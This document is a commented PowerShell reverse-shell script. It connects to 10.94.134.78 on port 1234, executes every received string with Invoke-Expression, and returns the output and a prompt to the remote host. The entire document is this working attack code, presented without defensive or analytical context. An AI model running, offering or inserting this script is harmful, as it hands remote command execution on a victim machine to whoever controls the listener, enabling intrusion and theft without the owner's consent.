# Create a TCPClient object and connect to the specified IP and port
$client = New-Object System.Net.Sockets.TCPClient('10.94.134.78', 1234)

# Get the network stream for reading and writing
$stream = $client.GetStream()

# Initialize a byte array for reading data
[byte[]]$bytes = 0..65535 | ForEach-Object {0}

# Loop to continuously read data from the stream
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    # Convert the byte array to a string command
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    
    # Execute the command and capture the output
    $sendback = (iex $data 2>&1 | Out-String)
    
    # Prepare the response with the current directory path
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    
    # Convert the response to a byte array
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    
    # Write the response back to the stream
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}

# Close the TCP connection
$client.Close()
